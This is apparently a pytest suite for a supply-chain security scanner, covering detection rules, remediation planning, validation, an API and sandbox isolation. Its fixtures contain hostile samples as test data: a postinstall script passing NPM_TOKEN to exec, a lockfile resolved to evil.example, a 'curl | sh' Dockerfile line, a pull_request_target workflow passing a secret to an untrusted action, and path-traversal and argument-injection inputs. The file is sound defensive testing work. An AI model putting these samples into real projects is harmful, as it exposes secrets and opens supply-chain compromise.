"""Rules, planner, prioritiser, reachability, validation, context, OKF, LLM helpers, server, sandbox."""
import json
import subprocess
import time

import pytest
import yaml
from conftest import FIX, mkrepo
from fastapi.testclient import TestClient

from sscg import context, okf, pipeline, reachability, relevance, remediation, sandbox, server, validation
from sscg.agents import kb, llm, prioritizer, schemas
from sscg.diff import Change
from sscg.discover import discover
from sscg.model import DepGraph
from sscg.rules import RULES, Ctx, run_all

H = {"sha": "h" * 40, "short": "hhh", "author": "B", "email": "b@x", "date": "d", "message": "m"}
PKG = '{"name":"a","dependencies":{"left-pad":"1.0.0"}}'
WF = ("on: pull_request_target\npermissions: write-all\njobs:\n  a:\n    runs-on: x\n    steps:\n"
      "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
      "      - uses: evil/action@main\n        with:\n          token: ${{ secrets.T }}\n")


def lock(**kw):
    return json.dumps({"lockfileVersion": 3, "packages": {
        "": {"dependencies": {"left-pad": "1.0.0"}},
        "node_modules/left-pad": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/left-pad.tgz",
                                  "integrity": "sha512-aaaa", **kw}}})


def rules_of(root, change=None):
    dg = DepGraph("r")
    discover(root, dg)
    out = run_all(Ctx(root, dg, change))
    assert not [n for n in dg.notes if "failed" in n]
    return {r["rule"] for r in out}


SCRIPT = '{"scripts":{"postinstall":"node x.js"}}'


@pytest.mark.parametrize("rule,files", [
    ("R01_TYPOSQUAT", {"requirements.txt": "reqeusts==1.0\n"}),
    ("R02_KNOWN_MALICIOUS", {"package.json": '{"dependencies":{"crossenv":"1.0.0"}}'}),
    ("R03_INSTALL_SCRIPT", {"package.json": SCRIPT}),
    ("R04_INSTALL_SCRIPT_CONTENT", {"package.json": SCRIPT, "x.js": "require('child_process').exec(process.env.NPM_TOKEN)"}),
    ("R05_LOCKFILE_UNTRUSTED_SOURCE", {"package.json": PKG, "package-lock.json": lock(resolved="https://evil.example/x")}),
    ("R09_UNPINNED_DEPENDENCY", {"requirements.txt": "flask\n"}),
    ("R10_UNTRUSTED_BASE_IMAGE", {"Dockerfile": "FROM someone/node:1\n"}),
    ("R11_MUTABLE_IMAGE_TAG", {"Dockerfile": "FROM node:latest\n"}),
    ("R12_REMOTE_SCRIPT_EXEC", {"Dockerfile": "FROM node:22\nRUN curl http://x.sh/s.sh | sh\n"}),
    ("R13_CONTAINER_HARDENING", {"Dockerfile": "FROM node:22\nRUN npm install\n"}),
    ("R14_CI_PWN_REQUEST", {".github/workflows/a.yml": WF}), ("R15_CI_UNPINNED_ACTION", {".github/workflows/a.yml": WF}),
    ("R16_CI_EXCESSIVE_PERMISSIONS", {".github/workflows/a.yml": WF}),
    ("R17_CI_SECRET_EXPOSURE", {".github/workflows/a.yml": WF}),
])
def test_rule(tmp_path, rule, files):
    assert rule in rules_of(mkrepo(tmp_path, files))


def node(**kw):
    return {"id": "pkg:npm/left-pad@1.0.0", "ecosystem": "npm", "name": "left-pad", "version": "1.0.0",
            "label": "left-pad@1.0.0", "source": "package-lock.json", "direct": True,
            "resolved": "https://registry.npmjs.org/left-pad.tgz", "integrity": "sha512-aaaa", **kw}


def upd(base, head, fields):
    return {"changed": [{"ecosystem": "npm", "name": "left-pad", "base": base, "head": head, "fields": fields}]}


@pytest.mark.parametrize("rule,ch", [
    ("R06_LOCKFILE_INTEGRITY_CHANGED", upd(node(integrity="sha512-b"), node(), ["integrity"])),
    ("R07_LOCKFILE_DRIFT", upd(node(version="0.9.0", label="left-pad@0.9.0"), node(), ["version"])),
    ("R08_UNEXPECTED_DEPENDENCY", {"added": [node()]}),
    ("R18_NEW_AUTHOR_SENSITIVE_CHANGE", {"files": [("M", "package.json")]}),
    ("R19_SUSPICIOUS_UPDATE", upd(node(version="0.9.0", label="left-pad@0.9.0"), node(install_script=True),
                                  ["version", "install_script"])),
])
def test_change_rule(tmp_path, rule, ch):
    root = mkrepo(tmp_path / "r", {"package.json": PKG, "package-lock.json": lock()})
    old = PKG.replace("1.0.0", "0.9.0") if rule.startswith("R19") else PKG
    base = mkrepo(tmp_path / "b", {"package.json": old})
    c = Change("b", H, H, False, True, ch.get("files", []), DepGraph("b"), base, added=ch.get("added", []),
               changed=ch.get("changed", []))
    assert rule in rules_of(root, c)


def test_kb_covers_rules_and_matches_the_yaml_originals():
    k = kb.load()
    assert {r for r in RULES if r < "R20"} == set(k.playbooks)
    for f, got in (("playbooks", k.playbooks), ("attack_patterns", k.patterns), ("policy", k.policy)):
        assert yaml.safe_load((FIX / f"kb_yaml/{f}.yaml").read_text(encoding="utf-8")) == got


# ---------------- context + OKF
@pytest.fixture
def ctx(tmp_path):
    c = context.Context("abcdefabcdef", tmp_path / "c.db", okf.Store(tmp_path / "okf"))
    yield c
    c.close()


F = {"finding_id": "F-001", "rule": "R05_LOCKFILE_UNTRUSTED_SOURCE", "title": "x [y](/evil.md)", "location": "a:1",
     "risk": {"score": 9.0}, "component": None,
     "evidence": [{"type": "advisory", "id": "GHSA-a", "severity": "HIGH", "url": "u", "cves": []}]}


def test_notes_and_okf(ctx):
    from sscg.target import LocalTarget
    ctx.start(LocalTarget(ctx.store.root.parent))
    cls = relevance.clusters(DepGraph("x"), [F])
    ctx.on_detection([F], cls)
    plan = {"proposal_id": "P-001", "finding_ids": ["F-001"], "cluster_ids": [cls[0]["cluster_id"]], "action": "pin"}
    assert ctx.write("RemediationPlan", plan) == []
    assert ctx.write("RemediationPlan", {**plan, "finding_ids": ["F-999"]})       # rejected, not repaired
    ok = {"proposal_id": "P-001", "decision": "approve", "decided_at": okf.now()}
    assert ctx.write("ApprovalNote", {**ok, "reviewer": "agent"})
    assert not ctx.write("ApprovalNote", {**ok, "reviewer": "human:v"})
    assert len(ctx.notes("RemediationPlan")) == 1 and len(ctx.notes("RemediationPlan", False)) == 2
    st, rem = ctx.store, "scans/abcdefabcdef/remediations/P-001"
    assert st.lint() == []
    assert st.card(rem)["trust"] == "human" and st.card(rem)["status"] == "stable"
    assert any(n["type"] == "playbook" for n in st.neighbors(f"scans/abcdefabcdef/clusters/{cls[0]['cluster_id']}"))
    assert st.search("lockfile untrusted source") and len(st.export("abcdefabcdef")) > 500
    for bad in ("../x", "/etc/passwd", "a/../../b"):
        with pytest.raises(KeyError):
            st.read(bad)


def test_triage_with_invented_evidence_is_replaced(ctx):
    ctx.on_detection([F], [])
    ctx.on_triage({"finding_id": "F-001", "verdict": "suspicious", "confidence": "high", "rationale": "r",
                   "benign_explanations": [], "cited_evidence": ["F-001/T9"]}, [])
    n = ctx.notes("TriageNote", False)
    assert [x["valid"] for x in n] == [False, True] and n[1]["payload"]["verdict"] == "needs_human_review"


# ---------------- analysis / remediation / validation
def test_reachability_and_priority(tmp_path):
    mkrepo(tmp_path, {"package.json": PKG, "package-lock.json": lock(), "a.js": "require('left-pad')"})
    dg = DepGraph("r")
    discover(tmp_path, dg)
    r = reachability.analyze(tmp_path, dg)["per_node"]["pkg:npm/left-pad@1.0.0"]
    assert r["status"] == "imported" and r["evidence"] == ["a.js:1"]
    f = {"finding_id": "F-001", "title": "t", "category": "vulnerability", "risk": {"score": 7.0, "level": "High"},
         "fixes": {}, "component": {"id": "n", "label": "n", "scope": "prod"}}
    ex = {"per_finding": {"F-001": {"kev": ["CVE-1"]}}}
    assert prioritizer.score_finding(f, ex, {"n": {"status": "imported"}}, None, {}).priority == "P0"
    assert prioritizer.score_finding(f, {}, {"n": {"status": "not_imported"}}, None, {}).priority == "P3"


def test_edits():
    e = remediation.apply_edit
    assert '"left-pad": "2.0.0"' in e(PKG, {"op": "npm_set", "name": "left-pad", "version": "2.0.0", "exact": True})
    assert e("a==1\nb\n", {"op": "req_set", "name": "b", "version": "2"}) == "a==1\nb==2\n"
    with pytest.raises(ValueError):
        e(PKG, {"op": "npm_set", "name": "nope", "version": "1", "file": "package.json"})


def test_new_ecosystem_is_manual_with_command():
    dg = DepGraph("r")
    discover(FIX / "eco/ruby", dg)
    a = {**dg.G.nodes["pkg:gem/rails@6.0.0"], "id": "pkg:gem/rails@6.0.0"}
    f = {"finding_id": "F-001", "rule": "VULN", "category": "vulnerability", "title": "t", "component": a, "evidence": [],
         "location": "Gemfile.lock:1", "type": "t", "fixes": {"upgrade_to_at_least": "6.0.1"}}
    p = remediation.Planner(FIX / "eco/ruby", dg, [f], [{"finding_id": "F-001", "priority": "P0"}], {}, None, kb.load()).plan()[0]
    assert not p["patchable"] and p["to_version"] == "6.0.1" and "bundle update rails" in p["notes"][0]


def res(after="ok", **kw):
    def step(p, s):
        return [{"step": f"{p}: npm test (.)", "status": s, "log": ""}]
    return {"steps_before": step("before", "ok"), "steps_after": step("after", after), "new": [], "docker": True,
            "per_proposal": {"P": {"targeted": ["F"], "resolved": ["F"]}}, **kw}


def test_verdict():
    assert validation.verdict(res())[:2] == ("verified", "high")
    assert validation.verdict(res(after="failed"))[0] == "failed"
    assert validation.verdict(res(docker=False))[:2] == ("partially_verified", "low")


@pytest.mark.parametrize("spec", ["git+https://x/y", "github:a/b", "a/b", "file:../x", "http://x/y.tgz", "npm:other@1"])
def test_host_relock_refuses(tmp_path, spec):
    mkrepo(tmp_path, {"package.json": json.dumps({"dependencies": {"x": spec}})})
    assert validation.safe_to_relock(tmp_path / "package.json")


def test_host_relock_accepts(tmp_path):
    mkrepo(tmp_path, {"package.json": '{"dependencies":{"x":"^1.2.3","y":">=1 <2"},"overrides":{"z":"$@s/z"}}'})
    assert validation.safe_to_relock(tmp_path / "package.json") is None


def test_no_docker_never_runs_repo_code(tmp_path, monkeypatch):
    repo = mkrepo(tmp_path / "r", {"package.json": '{"scripts":{"test":"node evil.js"}}', "Dockerfile": "FROM node:latest\n"})
    monkeypatch.setattr(sandbox, "available", lambda: False)
    real = subprocess.run

    def only_git(cmd, *a, **k):
        assert cmd[0] == "git", f"host execution: {cmd}"
        return real(cmd, *a, **k)
    monkeypatch.setattr(subprocess, "run", only_git)
    monkeypatch.setattr(pipeline.vulns, "osv_overlay", lambda dg: False)
    p = {"proposal_id": "P-001", "status": "approved", "patchable": True, "finding_ids": ["F-001"], "action": "pin",
         "edits": [{"file": "Dockerfile", "op": "replace_line", "match": "FROM node:latest", "new": "FROM node:22"}]}
    r = validation.validate(repo, [], None, [p], None, workdir=tmp_path / "w", log=lambda m: None)
    assert r["docker"] is False and all(s["status"] == "skipped" for s in r["steps_after"])


# ---------------- LLM helpers, server
def test_text_tool_call_recovery():
    assert llm._extract_json('<think>hm {}</think>{"name":"f","arguments":{"ok":true}}') == {"ok": True}
    assert llm._extract_json('```json\n{"ok": 1}\n```') == {"ok": 1}
    assert schemas.EvidenceRequest(tool="okf_search", query="x").query == "x"


def test_api():
    cl = TestClient(server.app)
    for bad in ("https://evil.com@github.com/x", "http://127.0.0.1/", "--help", "https://github.com/o/r@--x"):
        assert cl.post("/api/runs", json={"repo": bad}).status_code == 400, bad
    assert cl.post("/api/runs", json={"repo": "https://github.com/o/r", "base": "--x"}).status_code == 400
    assert cl.get("/api/okf/concepts/knowledge/playbooks/R01_TYPOSQUAT").json()["meta"]["type"] == "playbook"
    assert cl.get("/api/okf/concepts/..%2f..%2fx").status_code == 404
    r = cl.post("/api/okf/concepts/knowledge/playbooks/R01_TYPOSQUAT/verify", json={"by": "Vi"})
    assert r.json()["trust"] == "human"
    server.JOBS["j"] = {"id": "j", "status": "ok", "lines": ["hello"], "started": time.time(), "ended": 1, "project": "p",
                        "kind": "scan"}
    assert "hello" in cl.get("/api/jobs/j/events").text


# ---------------- real containers
TCP = ("node -e \"require('net').connect(443,'1.1.1.1').on('connect',()=>process.exit(0)).on('error',()=>process.exit(1))"
       ".setTimeout(4000,()=>process.exit(1))\"")


@pytest.mark.skipif(not sandbox.available(), reason="Docker is not running")
def test_sandbox_isolation(tmp_path):
    mkrepo(tmp_path, {"package.json": "{}"})
    with sandbox.Sandbox() as sb:
        sb.put(tmp_path, "a")

        def sh(s, **k):
            return sb.run("npm", ["sh", "-c", s], "a", **k)
        assert "uid=1000" in sh("id")["log"] and sh("touch /etc/x")["status"] == "failed"
        assert sh(TCP)["status"] == "failed" and sh(TCP, net=True)["status"] == "failed"
        assert sh("npm view left-pad version --fetch-retries=1", net=True, timeout=90)["status"] == "ok"
        assert sb.read("a/package.json") == "{}"
    assert sb.id not in subprocess.run(["docker", "volume", "ls"], capture_output=True, text=True).stdout
